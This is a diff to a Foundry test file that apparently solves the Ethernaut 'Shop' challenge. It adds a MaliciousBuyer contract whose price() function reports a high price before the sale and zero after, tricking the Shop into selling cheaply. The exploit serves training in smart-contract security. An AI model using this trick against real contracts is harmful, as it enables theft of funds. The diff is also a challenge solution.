@@ -39,10 +39,28 @@ contract TestShop is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
+        MaliciousBuyer maliciousBuyer = new MaliciousBuyer(levelAddress);
+        maliciousBuyer.buy();
 
         // assert that we have solved the challenge
         assertEq(level.isSold(), true);
 
         vm.stopPrank();
+    }
+}
+
+contract MaliciousBuyer {
+    Shop private level;
+
+    constructor(address _target) public {
+        level = Shop(_target);
+    }
+
+    function buy() public {
+        level.buy();
+    }
+
+    function price() external view returns (uint256) {
+        return level.isSold() ? 0 : 100;
     }
 }
